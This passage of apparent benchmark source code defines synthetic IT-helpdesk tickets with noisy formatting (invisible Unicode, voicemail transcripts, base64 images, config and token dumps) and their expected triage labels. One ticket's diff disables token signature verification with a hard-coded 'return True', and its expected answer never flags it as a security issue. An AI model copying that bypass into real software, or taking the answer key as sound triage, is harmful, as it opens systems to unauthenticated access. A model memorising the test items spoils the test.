                "The monitor is a Dell U2723QE connected via DisplayPort 1.4. The flickering "
                "started after I updated the NVIDIA drivers to version 560.94. My GPU is an "
                "NVIDIA RTX 4070. I've tried rolling back but the Device Manager says the "
                "previous driver is no longer available.\n\n"
                "Carlos Mendez | Quantitative Analysis | Building 2, Floor 6"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate Dell U2723QE monitor flickering after NVIDIA driver update "
                "to v560.94 — likely a driver compatibility issue with DisplayPort 1.4 "
                "on RTX 4070."
            ),
            remediation_steps=[
                "Download the previous NVIDIA driver version from the NVIDIA enterprise driver archive.",
                "Use Display Driver Uninstaller (DDU) in safe mode to cleanly remove the current driver.",
                "Install the previous known-good driver version and test for flickering.",
                "If resolved, add the problematic driver version to the deployment blocklist.",
                "Check if a newer driver hotfix addresses DisplayPort 1.4 flickering on RTX 4070.",
            ],
            reporter_name="Carlos Mendez",
            reporter_email="carlos.mendez@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64", "inline-image", "reply-chain", "screenshot-heavy"],
            difficulty="medium",
        ),
        # ── DC-079  Mobile autocorrect mangling technical terms ──────────
        ScenarioDefinition(
            scenario_id="DC-079",
            subject="Outlook keeps crashing on my phone",
            description=(
                "hey team my outlook keeps crashing on my iphone\n\n"
                "every time i open it and try to go to my calendar it freezes for like "
                "10 seconds then the app just closes. ive tried deleting and reinstalling "
                "the app but same thing happens\n\n"
                "im running iOS 18.3 and the outlook version is the latest from the "
                "appstore. its an iphone 15 pro if that matters\n\n"
                "also my exchange autopilot isnt working right, the conditional axcess "
                "policy keeps blocking me even tho im on the vpn. microsoft endtune "
                "shows my device as compliant but outlook still says 'your organization "
                "requires you to secure this device' and then crashes\n\n"
                "i talked to my manager and he said to tell you this is affecting the "
                "whole wealth mgmt team — at least 5 people r having the same issue "
                "since the intune policy was pushed on thursday\n\n"
                "can someone look at this asap? i need my calendar for client meetings "
                "tmrw morning\n\n"
                "thx\njamie"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Investigate Outlook crash on iOS tied to Intune conditional access "
                "policy push — affects multiple users in Wealth Management team since "
                "Thursday's policy deployment."
            ),
            remediation_steps=[
                "Check Intune admin console for the conditional access policy pushed Thursday.",
                "Verify the policy configuration for iOS devices and Outlook app protection.",
                "Review Outlook app crash logs from affected devices via Intune diagnostics.",
                "If the policy is misconfigured, roll it back for the Wealth Management group.",
                "Confirm fix with the reporter and other affected team members.",
            ],
            reporter_name="Jamie Rodriguez",
            reporter_email="jamie.rodriguez@contoso.com",
            reporter_department="Wealth Management",
            channel=Channel.CHAT,
            tags=["data-cleanup", "autocorrect", "typos", "mobile-input", "informal-language"],
            difficulty="medium",
        ),
        # ── DC-080  Speech-to-text transcription with accent errors ──────
        ScenarioDefinition(
            scenario_id="DC-080",
            subject="Voicemail transcription: Server room temperature alert",
            description=(
                "[Automated voicemail transcription — confidence: 62%]\n\n"
                "Hello I T support this is Rajesh from the Singapore office calling about "
                "the server rum on the third floor. The temparature monitoring system is "
                "showing 28 degrees sell see us in the main rack row and the a see units "
                "are making a very loud noise like grinding.\n\n"
                "I checked the bee em ess dashboard and it shows two of the three cooling "
                "units are showing read status. The third one is still green but it is not "
                "enough to cool the whole rum.\n\n"
                "The servers are showing high sea pee you temparatures in the eye low "
                "dashboard — some of the blade servers are throttling already at 85 degrees. "
                "If this continues we might have to do an emergency shut down of the non "
                "critical work loads.\n\n"
                "Please send someone urgently. My contact number is plus 65 nine one two "
                "three four five six seven eight. Thank you.\n\n"
                "[End of transcription]"
            ),
            category=Category.HARDWARE,
            priority=Priority.P1,
            team=Team.ENDPOINT,
            needs_escalation=True,
            missing_info=[MissingInfo.AFFECTED_SYSTEM],
            next_best_action=(
                "Dispatch facilities/engineering to Singapore server room immediately — "
                "two of three cooling units failed, rack temperatures at 28°C ambient and "
                "blade servers throttling at 85°C CPU. Risk of emergency shutdown."
            ),
            remediation_steps=[
                "Dispatch on-site facilities team to the Singapore 3rd floor server room immediately.",
                "Assess the two failed AC units — check for compressor failure, refrigerant leaks, or power issues.",
                "If cooling cannot be restored quickly, begin orderly shutdown of non-critical workloads.",
                "Engage the HVAC vendor for emergency repair or temporary portable cooling.",
                "Monitor iLO/IPMI dashboards for CPU thermal warnings and set alerts at 80°C threshold.",
            ],
            reporter_name="Rajesh Krishnamurthy",
            reporter_email="rajesh.krishnamurthy@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.PHONE,
            tags=["data-cleanup", "speech-to-text", "voicemail", "transcription-errors", "accent-noise"],
            difficulty="hard",
        ),
        # ── DC-081  Zero-width Unicode and invisible characters ──────────
        ScenarioDefinition(
            scenario_id="DC-081",
            subject="Can\u200bt a\u200bc\u200bcess Sha\u200brePoint si\u200bte",
            description=(
                "Hi\u200b IT\u200b Support,\n\n"
                "I\u200b can\u200bt\u200b access\u200b the\u200b SharePoint\u200b "
                "site\u200b for\u200b our\u200b team.\u200b When\u200b I\u200b try\u200b "
                "to\u200b open\u200b https://contoso.sharepoint.com/sites/trading-ops\u200b "
                "I\u200b get\u200b a\u200b 403\u200b Forbidden\u200b error.\n\n"
                "I\u200b was\u200b able\u200b to\u200b access\u200b it\u200b "
                "yesterday\u200b but\u200b today\u200b it\u200b says\u200b I\u200b "
                "don\u200bt\u200b have\u200b permission.\u200b My\u200b manager\u200b "
                "Li\u200b Wei\u200b said\u200b she\u200b didn\u200bt\u200b remove\u200b "
                "me\u200b from\u200b the\u200b group.\n\n"
                "I\u200b need\u200b access\u200b to\u200b the\u200b Q2\u200b "
                "trading\u200b strategy\u200b documents\u200b urgently.\u200b "
                "The\u200b quarterly\u200b review\u200b is\u200b tomorrow.\n\n"
                "Thanks,\n"
                "Mei\u200b Chen\u200b\n"
                "Trading\u200b Operations"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate 403 Forbidden error for SharePoint site "
                "contoso.sharepoint.com/sites/trading-ops — user had access yesterday, "
                "likely a group membership or permissions change."
            ),
            remediation_steps=[
                "Check the SharePoint site permissions and group membership for the user.",
                "Verify if any recent permission changes or group policy updates affected access.",
                "If membership is correct, check for conditional access policies blocking the user.",
                "Restore access and confirm the user can reach the trading strategy documents.",
                "Review audit logs to determine what changed the permissions.",
            ],
            reporter_name="Mei Chen",
            reporter_email="mei.chen@contoso.com",
            reporter_department="Trading",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "zero-width-chars", "invisible-unicode", "copy-paste-artifacts"],
            difficulty="medium",
        ),
        # ── DC-082  Auto-translated email with translation artifacts ─────
        ScenarioDefinition(
            scenario_id="DC-082",
            subject="[Translated from Japanese] Problem with network connection in the London office",
            description=(
                "[This message was automatically translated from Japanese]\n"
                "[Translation confidence: Medium]\n\n"
                "Dear IT Help Table,\n\n"
                "I am writing to you about the internet connection problem that is occurring "
                "in the London office Building 5, Floor 2. The network is doing 'going on and "
                "off' behavior since the morning of today.\n\n"
                "When I make the ping to the server of gateway (192.168.5.1), the packet loss "
                "is showing 30-40% of the ratio. The speed test is revealing 2 Mbps of the "
                "download which is very far from the normal 500 Mbps that we are usually "
                "receiving.\n\n"
                "The problem is affecting approximately 15 persons of the Fixed Income team "
                "who are sitting in the same area. The wireless access point that we are "
                "connecting to has the name 'LON-B5-F2-AP04'. The other access points in "
                "the near vicinity seem to be functioning with normality.\n\n"
                "We attempted the restart of our laptop computers and the clearing of the "
                "DNS cache but the problem is persisting. The Bloomberg terminals that are "
                "connected by the ethernet cable are not having this problem.\n\n"
                "Please investigate this matter with urgency as the Fixed Income team cannot "
                "execute the trades with reliability in the current condition.\n\n"
                "With respectful regards,\n"
                "Takeshi Yamamoto\n"
                "Fixed Income Division, London Office"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Investigate wireless AP LON-B5-F2-AP04 in London Building 5, Floor 2 — "
                "30-40% packet loss and 2 Mbps throughput affecting 15 Fixed Income team "
                "members. Wired connections unaffected."
            ),
            remediation_steps=[
                "Check the status of access point LON-B5-F2-AP04 in the wireless controller.",
                "Review AP logs for hardware errors, channel interference, or client association issues.",
                "Run a wireless site survey to check for co-channel interference or rogue APs.",
                "If the AP is faulty, replace it and verify connectivity for affected users.",
                "Monitor the replacement AP for 24 hours to confirm stability.",
            ],
            reporter_name="Takeshi Yamamoto",
            reporter_email="takeshi.yamamoto@contoso.com",
            reporter_department="Fixed Income",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "auto-translation", "translation-artifacts", "non-native-english"],
            difficulty="medium",
        ),
        # ── DC-083  HTML with CSS color/style artifacts from dark mode ───
        ScenarioDefinition(
            scenario_id="DC-083",
            subject="Database query performance degradation",
            description=(
                '<div style="background-color: #1e1e1e; color: #d4d4d4; '
                'font-family: Consolas, monospace; padding: 10px;">\n'
                '<span style="color: #d4d4d4;">Hi DBA team,</span><br/><br/>\n'
                '<span style="color: #ce9178;">Our production SQL Server instance '
                "(SQLPROD-03) is experiencing severe performance degradation since "
                "this morning.</span><br/><br/>\n"
                '<span style="color: #569cd6;">Key symptoms:</span><br/>\n'
                '<span style="color: #d4d4d4;">&bull; Average query response time '
                "increased from 50ms to 3,200ms</span><br/>\n"
                '<span style="color: #d4d4d4;">&bull; CPU utilization at 94% '
                "(normally 35%)</span><br/>\n"
                '<span style="color: #d4d4d4;">&bull; TempDB is growing rapidly '
                "&mdash; currently at 180GB (normally 20GB)</span><br/>\n"
                '<span style="color: #d4d4d4;">&bull; Multiple blocking chains '
                "in sys.dm_exec_requests</span><br/><br/>\n"
                '<span style="color: #ce9178;">I suspect the new ETL job that was '
                "deployed last night (job: DailyRiskCalc_v2) is causing excessive "
                "TempDB spills. The previous version was fine.</span><br/><br/>\n"
                '<span style="color: #569cd6;">Server details:</span><br/>\n'
                '<span style="color: #d4d4d4;">&bull; SQL Server 2022 (16.0.4145.4)'
                "</span><br/>\n"
                '<span style="color: #d4d4d4;">&bull; 256GB RAM, 64 cores</span>'
                "<br/>\n"
                '<span style="color: #d4d4d4;">&bull; SAN storage: Pure FlashArray'
                "</span><br/><br/>\n"
                '<span style="color: #d4d4d4;">Regards,<br/>Hannah Park<br/>'
                "Data Engineering</span>\n</div>"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate SQL Server SQLPROD-03 performance degradation — "
                "TempDB at 180GB (9x normal), 94% CPU, and 3.2s avg query time "
                "since DailyRiskCalc_v2 ETL deployment last night."
            ),
            remediation_steps=[
                "Identify the blocking head in sys.dm_exec_requests and capture the query plan.",
                "Check the DailyRiskCalc_v2 ETL job execution plan for TempDB spills.",
                "If confirmed, roll back to the previous ETL job version (DailyRiskCalc_v1).",
                "Shrink TempDB after the blocking is resolved and monitor for recurrence.",
                "Review the v2 ETL query for missing indexes or inefficient joins causing spills.",
            ],
            reporter_name="Hannah Park",
            reporter_email="hannah.park@contoso.com",
            reporter_department="Data Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "html-heavy", "css-dark-mode", "styled-email", "entities"],
            difficulty="medium",
        ),
        # ── DC-084  Mass-forwarded alert with 50+ recipient headers ──────
        ScenarioDefinition(
            scenario_id="DC-084",
            subject="FW: FW: FW: URGENT: Production Alert — Market Data Feed Down",
            description=(
                "---------- Forwarded message ----------\n"
                "From: Monitoring System <alerts@contoso.com>\n"
                "To: trading-floor-all@contoso.com; risk-management@contoso.com; "
                "compliance-team@contoso.com; it-operations@contoso.com; "
                "market-data-team@contoso.com; quant-research@contoso.com; "
                "portfolio-mgmt@contoso.com; exec-team@contoso.com; "
                "fixed-income@contoso.com; equity-trading@contoso.com; "
                "derivatives-desk@contoso.com; settlements@contoso.com; "
                "middle-office@contoso.com; fund-admin@contoso.com; "
                "investor-relations@contoso.com; treasury@contoso.com; "
                "corporate-strategy@contoso.com; private-banking@contoso.com; "
                "asset-management@contoso.com; regulatory-affairs@contoso.com; "
                "legal-dept@contoso.com; hr-department@contoso.com; "
                "finance-dept@contoso.com; facilities@contoso.com; "
                "procurement@contoso.com; it-security@contoso.com; "
                "devops-team@contoso.com; qa-team@contoso.com; "
                "customer-success@contoso.com; business-dev@contoso.com; "
                "marketing@contoso.com; payroll@contoso.com; "
                "learning-dev@contoso.com; corp-comms@contoso.com; "
                "public-relations@contoso.com; esg-team@contoso.com\n"
                "CC: cto@contoso.com; cio@contoso.com; coo@contoso.com; "
                "cfo@contoso.com; ceo@contoso.com\n"
                "Date: Mon, 17 Mar 2026 09:15:00 -0400\n"
                "Subject: URGENT: Production Alert — Market Data Feed Down\n"
                "X-Priority: 1\n"
                "X-MS-Exchange-Organization-SCL: -1\n"
                "X-Mailer: ContosoAlerts/3.2.1\n\n"
                "---------- Forwarded by David Kim ----------\n"
                "Adding IT support to this thread.\n\n"
                "---------- Forwarded by Sarah Chen ----------\n"
                "FYI — this is impacting the entire trading floor.\n\n"
                "---------- Original Alert ----------\n"
                "[CRITICAL] Bloomberg B-PIPE market data feed disconnected at 09:12:04 ET.\n"
                "Feed ID: BPIPE-NYC-PRIMARY\n"
                "Last good tick: 2026-03-17T09:12:03.847Z\n"
                "Failover status: Secondary feed (BPIPE-NYC-DR) attempting connection...\n"
                "Affected systems: Real-time pricing engine, Risk calculation, Order routing\n"
                "Estimated impact: All equity and fixed income desks (NYC)\n\n"
                "This is an automated alert from the Market Data Monitoring System."
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P1,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate Bloomberg B-PIPE primary feed disconnection at 09:12 ET — "
                "all NYC equity and fixed income desks affected. Check failover to "
                "secondary feed BPIPE-NYC-DR."
            ),
            remediation_steps=[
                "Check the Bloomberg B-PIPE connection status and error logs on the primary feed server.",
                "Verify the secondary feed (BPIPE-NYC-DR) failover — confirm it connected successfully.",
                "If secondary feed is active, confirm data quality and latency are acceptable.",
                "Contact Bloomberg support if both feeds are down to report the outage.",
                "Once primary feed is restored, verify data consistency and rebalance load.",
            ],
            reporter_name="David Kim",
            reporter_email="david.kim@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "mass-forward", "massive-cc-list", "alert-flood", "email-headers"],
            difficulty="hard",
        ),
        # ── DC-085  JWT/OAuth error dump pasted inline ──────────────────
        ScenarioDefinition(
            scenario_id="DC-085",
            subject="SSO login failing with token error",
            description=(
                "I can't log into the internal trading portal. When I click 'Sign in with "
                "Contoso SSO' it redirects me back to the login page with an error. I opened "
                "the browser dev tools and copied what I saw:\n\n"
                "GET /auth/callback?code=M.C107_BAY.2.U.0a1b2c3d-4e5f-6789-abcd-ef0123456789"
                "&state=eyJub25jZSI6IjEyMzQ1Njc4OTAiLCJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vdHJh"
                "ZGluZy5jb250b3NvLmNvbS9kYXNoYm9hcmQifQ=="
                "&session_state=1a2b3c4d-5e6f-7890-abcd-ef1234567890\n\n"
                "Response 401:\n"
                "{\n"
                '  "error": "invalid_grant",\n'
                '  "error_description": "AADSTS700082: The refresh token has expired due to '
                "inactivity. The token was issued on 2026-02-15T14:23:00Z and was inactive "
                'for 30 days.",\n'
                '  "error_codes": [700082],\n'
                '  "timestamp": "2026-03-17T10:45:12.3456789Z",\n'
                '  "trace_id": "a1b2c3d4-e5f6-7890-abcd-ef0123456789",\n'
                '  "correlation_id": "f0e1d2c3-b4a5-9687-7654-321098765432",\n'
                '  "error_uri": "https://login.microsoftonline.com/error?code=700082"\n'
                "}\n\n"
                "I also see this JWT payload in the network tab (token I got before it expired):\n"
                "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjFGNDRGMUNBQTY5MjM5Nzk2R"
                "DM1RUNCM0U3QTJBMjFEMzRBRUEifQ.eyJhdWQiOiJhcGk6Ly90cmFkaW5nLmNvbnRv"
                "c28uY29tIiwiaXNzIjoiaHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tL2Nv"
                "bnRvc28uY29tIiwiaWF0IjoxNzQwNjYxOTgwLCJuYmYiOjE3NDA2NjE5ODAsImV4cCI6"
                "MTc0MDY2NTU4MCwibmFtZSI6IlBhdWwgVGhvbXBzb24iLCJvaWQiOiIxMjM0NTY3OC"
                "05YWJjLWRlZjAtMTIzNC01Njc4OWFiY2RlZjAiLCJwcmVmZXJyZWRfdXNlcm5hbWUi"
                "OiJwYXVsLnRob21wc29uQGNvbnRvc28uY29tIiwic2NwIjoiVHJhZGluZy5SZWFkV3"
                "JpdGUiLCJzdWIiOiJhYmNkZWYxMjM0NTY3ODkwIiwidGlkIjoiY29udG9zby5jb20i"
                "fQ.signature_placeholder\n\n"
                "I need to access the trading platform urgently as I have morning trades "
                "to execute. Can someone fix this?"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Resolve SSO token refresh failure (AADSTS700082) for trading portal — "
                "user's refresh token expired after 30 days of inactivity. Need to "
                "reauthorize the session."
            ),
            remediation_steps=[
                "Have the user clear browser cookies and cached tokens for the trading portal.",
                "Instruct the user to sign in again via the SSO portal to get a fresh token pair.",
                "If sign-in still fails, check Azure AD for the user's session and revoke stale tokens.",
                "Verify the trading portal's OAuth client configuration for refresh token lifetime policy.",
                "Consider reducing token inactivity timeout or enabling continuous access evaluation.",
            ],
            reporter_name="Paul Thompson",
            reporter_email="paul.thompson@contoso.com",
            reporter_department="Institutional Trading",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "jwt-token", "oauth-dump", "json-error", "auth-trace"],
            difficulty="medium",
        ),
        # ── DC-086  Docker Compose / YAML config dump pasted inline ──────
        ScenarioDefinition(
            scenario_id="DC-086",
            subject="Container deployment failing in staging",
            description=(
                "Hi team,\n\n"
                "Our staging deployment pipeline is failing. The risk-engine container "
                "keeps crash-looping. Here's the docker-compose.yml we're using:\n\n"
                "```yaml\n"
                "version: '3.8'\n"
                "services:\n"
                "  risk-engine:\n"
                "    image: contoso.azurecr.io/risk-engine:2.4.1\n"
                "    deploy:\n"
                "      replicas: 3\n"
                "      resources:\n"
                "        limits:\n"
                "          cpus: '4'\n"
                "          memory: 8G\n"
                "        reservations:\n"
                "          cpus: '2'\n"
                "          memory: 4G\n"
                "    environment:\n"
                "      - REDIS_HOST=redis-cluster.staging.svc\n"
                "      - REDIS_PORT=6379\n"
                "      - DB_HOST=sqlserver-staging.contoso.internal\n"
                "      - DB_PORT=1433\n"
                "      - DB_NAME=RiskCalcStaging\n"
                "      - LOG_LEVEL=DEBUG\n"
                "      - MARKET_DATA_ENDPOINT=http://market-data:8080/api/v2\n"
                "    ports:\n"
                "      - '8443:8443'\n"
                "    depends_on:\n"
                "      - redis-cluster\n"
                "      - market-data\n"
                "    healthcheck:\n"
                "      test: ['CMD', 'curl', '-f', 'http://localhost:8443/health']\n"
                "      interval: 30s\n"
                "      timeout: 10s\n"
                "      retries: 3\n"
                "  redis-cluster:\n"
                "    image: redis:7-alpine\n"
                "    ports:\n"
                "      - '6379:6379'\n"
                "  market-data:\n"
                "    image: contoso.azurecr.io/market-data-mock:1.0.0\n"
                "    ports:\n"
                "      - '8080:8080'\n"
                "```\n\n"
                "The container logs show:\n"
                "```\n"
                "risk-engine_1  | 2026-03-17 08:15:03 ERROR Failed to connect to "
                "sqlserver-staging.contoso.internal:1433 — Connection refused\n"
                "risk-engine_1  | 2026-03-17 08:15:03 ERROR Database initialization "
                "failed after 5 retries\n"
                "risk-engine_1  | 2026-03-17 08:15:03 FATAL Shutting down due to "
                "unrecoverable error\n"
                "```\n\n"
                "It looks like the SQL Server staging instance is unreachable from the "
                "container. The database was migrated to a new server last week — maybe "
                "the hostname changed?"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "Investigate staging SQL Server connectivity failure for risk-engine "
                "container — DB host sqlserver-staging.contoso.internal may have changed "
                "after last week's migration."
            ),
            remediation_steps=[
                "Verify the current hostname/IP of the staging SQL Server after the migration.",
                "Update the DB_HOST environment variable in docker-compose.yml if it changed.",
                "Check network connectivity between the container network and the SQL Server.",
                "Verify SQL Server is accepting connections on port 1433 and the firewall rules allow it.",
                "Restart the deployment and verify the risk-engine container passes health checks.",
            ],
            reporter_name="Liam O'Sullivan",
            reporter_email="liam.osullivan@contoso.com",
            reporter_department="Backend Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "yaml-config", "docker-compose", "container-logs", "inline-code"],
            difficulty="medium",
        ),
        # ── DC-087  Git diff output pasted as ticket body ──────────────
        ScenarioDefinition(
            scenario_id="DC-087",
            subject="Code review system broken after merge",
            description=(
                "The PR review system stopped working after my merge. Here's the diff that "
                "broke it:\n\n"
                "```diff\n"
                "diff --git a/src/auth/middleware.py b/src/auth/middleware.py\n"
                "index 7a8b9c0..1d2e3f4 100644\n"
                "--- a/src/auth/middleware.py\n"
                "+++ b/src/auth/middleware.py\n"
                "@@ -42,7 +42,7 @@ class AuthMiddleware:\n"
                "     def validate_token(self, token: str) -> bool:\n"
                "-        if not token or len(token) < 10:\n"
                "+        if not token:\n"
                "             return False\n"
                "-        return self._verify_signature(token)\n"
                "+        # TODO: re-enable signature verification after cert rotation\n"
                "+        return True  # TEMPORARY BYPASS\n"
                " \n"
                "     def _verify_signature(self, token: str) -> bool:\n"
                "         try:\n"
                "@@ -67,3 +68,8 @@ class AuthMiddleware:\n"
                "             logger.error(f'Token verification failed: {e}')\n"
                "             return False\n"
                "+\n"
                "+    def _skip_auth_for_testing(self):\n"
                "+        # Added for load testing - remove before production\n"
                "+        self._auth_enabled = False\n"
                "+        logger.warning('Authentication disabled for testing')\n"
                "```\n\n"
                "After this merge, the Azure DevOps pipeline that runs PR checks started "
                "returning 500 errors on the webhook endpoint. The pipeline was working "
                "fine before the merge. I don't think my code changes caused the pipeline "
                "failure — it's more likely something with the DevOps agent or the webhook "
                "configuration.\n\n"
                "Can someone check the pipeline agent pool and the webhook endpoint?"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate Azure DevOps pipeline webhook 500 errors after code merge — "
                "check pipeline agent status and webhook endpoint configuration."
            ),
            remediation_steps=[
                "Check Azure DevOps pipeline run logs for the 500 error details.",
                "Verify the webhook endpoint is healthy and accessible from the DevOps agent.",
                "Check the agent pool status — ensure agents are online and not in error state.",
                "Test the webhook endpoint manually with a sample payload.",
                "If the webhook is down, restart the service and requeue the failed pipeline run.",
            ],
            reporter_name="Ethan Brooks",
            reporter_email="ethan.brooks@contoso.com",
            reporter_department="Backend Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "git-diff", "code-paste", "inline-code", "pipeline-output"],
            difficulty="medium",
        ),
        # ── DC-088  Multiple base64 data URIs claiming to be screenshots ─
        ScenarioDefinition(
            scenario_id="DC-088",
            subject="Multiple errors on dashboard — see all screenshots",
            description=(
                "Hi Support,\n\n"
                "Our risk dashboard is showing multiple errors. I took screenshots of each "
                "one. Sorry they're embedded inline — our email client does this automatically.\n\n"
                "Screenshot 1 — Main dashboard shows 'Data Feed Error':\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA"
                "GXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5h"
                "ZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6"
                "cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8i\n\n"
                "Screenshot 2 — Real-time pricing widget stuck on 'Loading...':\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABm"
                "JLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH5QMRCQsKPjNT"
                "LQAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAJElEQVQ4"
                "y2P4z8BQz0AENDMwMNQzEAfqGRgYGIiE9QwMDADGLwkGHBMbCAAAACV0RVh0ZGF0ZTpj\n\n"
                "Screenshot 3 — Error modal: 'WebSocket connection to wss://feed.contoso.com failed':\n"
                "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4QBMRXhpZgAATU0AKgAA"
                "AAgAAgESAAMAAAABAAEAAIdpAAQAAAABAAAAJgAAAAAAAqACAAQAAAABAAAAIKADAAQAAAAB"
                "AAAAIAAAAABiiS0AAAKiYMn8kAMxODYuOTMuNTguMTIw\n\n"
                "Screenshot 4 — Network tab showing repeated 503 responses:\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAF"
                "UlEQVQYV2P8z8BQz0AEYBxVOHIVAvcHBQHzKSECAAAAAElFTkSuQmCC\n\n"
                "The dashboard URL is https://risk.contoso.com/dashboard/main. The WebSocket "
                "feed for real-time pricing at wss://feed.contoso.com keeps disconnecting. "
                "This started about 30 minutes ago and affects all traders on the NYC floor.\n\n"
                "— Rachel Torres, Portfolio Management"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P1,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate risk dashboard outage — WebSocket feed at wss://feed.contoso.com "
                "disconnecting with 503 errors, affecting all NYC floor traders' real-time "
                "pricing and risk calculations."
            ),
            remediation_steps=[
                "Check the WebSocket server (feed.contoso.com) health and container/process status.",
                "Investigate the 503 errors — check load balancer logs and upstream server health.",
                "If the feed server crashed, restart it and verify WebSocket connections resume.",
                "Confirm the risk dashboard reconnects and real-time pricing data flows correctly.",
                "Review the feed server logs for the root cause of the disconnection.",
            ],
            reporter_name="Rachel Torres",
            reporter_email="rachel.torres@contoso.com",
            reporter_department="Portfolio Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64", "multiple-screenshots", "inline-image", "data-uri-flood"],
            difficulty="hard",
        ),
        # ── DC-089  Extremely terse ticket — almost no context ──────────
        ScenarioDefinition(
            scenario_id="DC-089",
            subject="broken",
            description="laptop wont turn on. need it fixed today.",
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[
                MissingInfo.DEVICE_INFO,
                MissingInfo.ERROR_MESSAGE,
                MissingInfo.STEPS_TO_REPRODUCE,
                MissingInfo.BUSINESS_IMPACT,
            ],
            next_best_action=(
                "Request additional details from the reporter — laptop make/model, "
                "any power LED indicators, whether it was working recently, and what "
                "happened before it stopped turning on."
            ),
            remediation_steps=[
                "Contact the reporter to gather device details (make, model, asset tag).",
                "Ask if there are any LED indicators when pressing the power button.",
                "Determine if the laptop was dropped, exposed to liquid, or had a recent update.",
                "If basic troubleshooting fails, schedule a hardware inspection.",
                "Provide a loaner device if the repair will take more than one business day.",
            ],
            reporter_name="Alex Rivera",
            reporter_email="alex.rivera@contoso.com",
            reporter_department="Marketing",
            channel=Channel.CHAT,
            tags=["data-cleanup", "terse-message", "minimal-context", "no-details"],
            difficulty="easy",
        ),
        # ── DC-090  Mixed LTR/RTL with bidi Unicode control characters ──
        ScenarioDefinition(
            scenario_id="DC-090",
            subject="SharePoint \u202asite\u202c \u202baccess\u202c issue — \u202bالوصول\u202c denied",
            description=(
                "Hi IT team,\n\n"
                "I am having an issue accessing the SharePoint site for the Dubai "
                "client portfolio.\n\n"
                "The site URL is: https://contoso.sharepoint.com/sites/\u202bDubai-Portfolio\u202c\n\n"
                "When I try to access the \u202bمحفظة دبي\u202c (Dubai Portfolio) section, "
                "I get an error message that says:\n"
                "\u202b'ليس لديك إذن للوصول إلى هذا المورد'\u202c\n"
                "(Translation: 'You do not have permission to access this resource')\n\n"
                "I need to access the following documents:\n"
                "1. \u202bتقرير الأداء الربعي Q1 2026\u202c (Q1 2026 Performance Report)\n"
                "2. \u202bتحليل المخاطر - مارس 2026\u202c (Risk Analysis - March 2026)\n"
                "3. \u202bاستراتيجية الاستثمار\u202c (Investment Strategy)\n\n"
                "My manager \u202bأحمد الفارسي\u202c (Ahmed Al-Farsi) approved my access "
                "request last week through the IAM portal (request ID: IAM-2026-04521). "
                "The approval shows as 'Completed' in the portal but I still can't access "
                "the site.\n\n"
                "This is urgent because I have a client presentation tomorrow morning at "
                "9 AM GST.\n\n"
                "Thanks,\n"
                "Fatima Al-Rashid\n"
